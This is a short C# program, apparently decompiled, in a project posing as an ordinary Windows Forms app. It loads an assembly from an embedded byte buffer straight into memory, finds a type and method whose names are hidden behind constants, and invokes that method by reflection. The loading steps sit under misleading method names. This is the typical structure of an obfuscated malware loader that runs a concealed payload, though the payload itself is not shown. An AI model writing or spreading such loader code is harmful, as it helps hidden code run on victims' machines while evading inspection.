using System;
using System.Collections.Generic;
using System.Reflection;
using System.Threading;

namespace WindowsFormsApp47;

internal class Program
{
	private static List<object> list;

	private static void Main()
	{
		list = new List<object>();
		Refresh();
		if (list.Count == 1)
		{
			Stop();
			Pasue();
		}
	}

	private static void Refresh()
	{
		list.Add(Thread.GetDomain().Load(Hip.Buffer()));
	}

	private static void Stop()
	{
		Type type = ((Assembly)list[0]).GetType(Text.Ho);
		list.Clear();
		list.Add(type);
	}

	private static void Pasue()
	{
		MethodInfo method = ((Type)list[0]).GetMethod(Text.Pe);
		list.Clear();
		list.Add(method.Invoke(null, null));
	}
}
